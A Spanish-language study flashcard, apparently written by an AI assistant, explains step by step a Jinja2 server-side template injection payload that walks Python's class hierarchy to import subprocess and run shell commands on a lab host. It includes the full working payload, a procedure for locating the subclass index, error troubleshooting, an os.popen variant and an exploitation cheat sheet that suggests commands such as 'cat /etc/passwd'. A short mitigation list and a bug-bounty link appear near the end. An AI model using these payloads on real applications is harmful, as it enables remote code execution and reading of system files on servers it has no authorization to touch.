Título: **SSTI Jinja2 → ejecución de comandos (explicación desde 0, flashcard)**

Objetivo: entender exactamente qué hace este payload y por qué funciona:

```
http://10.201.44.37:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[356].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('whoami', shell=True).decode() }}
```

Prerequisitos mínimos

* Jinja2 permite evaluar **expresiones** `{{ ... }}` en plantillas. No permite sentencias `import` desde la plantilla.
* Python: todo es objeto. Los objetos exponen atributos mágicos: `__class__`, `__mro__`, `__subclasses__()`, `__init__.__globals__`, `__builtins__`, `__import__`.
* Entorno de laboratorio controlado (THM/HTB/VM).

Desglose paso a paso (cada fragmento y su propósito)

1. `''`

   * Una cadena vacía, literal accesible desde Jinja. Punto de partida: cualquier objeto.

2. `''.__class__`

   * Devuelve la clase del objeto: `<class 'str'>`.

3. `''.__class__.__mro__`

   * MRO = Method Resolution Order. Es una tupla con la jerarquía de herencia: `(str, object, ...)`.
   * Queremos `object`, normalmente en índice `1`.

4. `''.__class__.__mro__[1]`

   * Accedemos a `object` (raíz común).

5. `''.__class__.__mro__[1].__subclasses__()`

   * Lista de todas las clases que heredan de `object`. Esta lista contiene cientos de clases internas (incluye `subprocess.Popen`, `module`, etc.). **El orden y contenido dependen de la versión/entorno**.

6. `...[356]`

   * Selecciona la clase en la posición 356 de esa lista. En tu entorno concreto, índice **356 = `<class 'subprocess.Popen'>`**.
   * **IMPORTANTE**: el índice cambia por entorno; siempre confirmar listando.

7. `...__init__.__globals__`

   * Accede al diccionario de variables globales del método `__init__` de la clase seleccionada. Desde ahí podemos alcanzar `__builtins__` y funciones como `__import__`.

8. `['__builtins__']['__import__']('subprocess')`

   * Llama al import dinámico de Python desde los builtins para cargar el módulo `subprocess` en tiempo de ejecución.

9. `.check_output('whoami', shell=True)`

   * Usa `subprocess.check_output` para ejecutar el comando `whoami` en shell y recoger la salida como `bytes`.

10. `.decode()`

    * Decodifica `bytes` a `str` (salida legible).

Resumen corto del flujo lógico

1. Partir de un objeto permitido por Jinja (`''`).
2. Subir a `object` via `.__class__.__mro__`.
3. Enumerar `__subclasses__()` para exponer clases con punteros a ámbitos globales.
4. Localizar una clase con `__init__.__globals__` que permita acceder a `__import__`.
5. `__import__('subprocess')` → ejecutar comando con `check_output` → `.decode()`.

Cómo confirmar/identificar el índice (procedimiento rápido)

1. Envío 1: lista las clases y revisa el volcado:

   ```
   {{ ''.__class__.__mro__[1].__subclasses__() }}
   ```
2. Busca la entrada que diga `subprocess.Popen` o `subprocess.CompletedProcess`. Anota su posición (índice).
3. Si la respuesta es masiva, prueba rangos: `{{ ''.__class__.__mro__[1].__subclasses__()[0:60] }}`, etc.
4. Alternativa: en el servidor local/tu VM, replicá `len(object.__subclasses__())` y `object.__subclasses__().index(subprocess.Popen)` para saber el índice típico.

Errores comunes y diagnóstico rápido

* `IndexError` → índice fuera de rango. Re-listar y buscar.
* `AttributeError`/`TypeError` → el objeto en ese índice no expone `__init__.__globals__` o no es invocable como esperabas. Cambiar índice.
* Salida vacía o `None` → la aplicación puede truncar/suprimir salidas o el comando no devolvió stdout. Prueba `check_output` en lugar de `Popen`.
* Resultado en bytes no decodificado → falta `.decode()`.

Variantes útiles (más robustas)

* Evitar instanciar `Popen`: usar `check_output` directamente desde `__import__`:

  ```
  {{ ''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('whoami', shell=True).decode() }}
  ```
* Si no hay `subprocess` en globals, usar:

  ```
  __builtins__['__import__']('os').popen('whoami').read()
  ```

Buenas prácticas de laboratorio

* Confirmar SSTI simple: `{{7*7}}` → `49`.
* Empieza listando `__subclasses__()` y procurando índices bajos; evita barridos masivos que puedan tripear protecciones.
* Trabaja sobre copias/VMs y con autorización explícita.

Mitigaciones que debes reconocer (para defensores)

* No renderizar plantillas con contenido controlado por el usuario.
* Usar `SandboxedEnvironment` de Jinja2 o restringir `globals()` pasados a la plantilla.
* Ejecutar renderizado en contenedores/usuarios con mínimos privilegios.

Cheat-sheet rápido (pasos de explotación en laboratorio)

1. Verificar SSTI: `{{7*7}}`.
2. Listar subclasses: `{{ ''.__class__.__mro__[1].__subclasses__() }}`.
3. Localizar índice `IDX` con `subprocess.Popen` o `CompletedProcess`.
4. Ejecutar:

   ```
   {{ ''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('whoami', shell=True).decode() }}
   ```
5. Iterar con otros comandos (`id`, `ls`, `cat /etc/passwd`) según permisos y objetivo de laboratorio.

Recuerda: el punto crítico es **apuntar al índice correcto** en `__subclasses__()` y usar `__import__` desde `__init__.__globals__` o `__builtins__`. Si querés, te doy ahora un flashcard aún más condensado (2–3 puntos) para memorización. ¿Lo genero?


VER CASO DE ESTUDIO UBER 
https://hackerone.com/reports/125980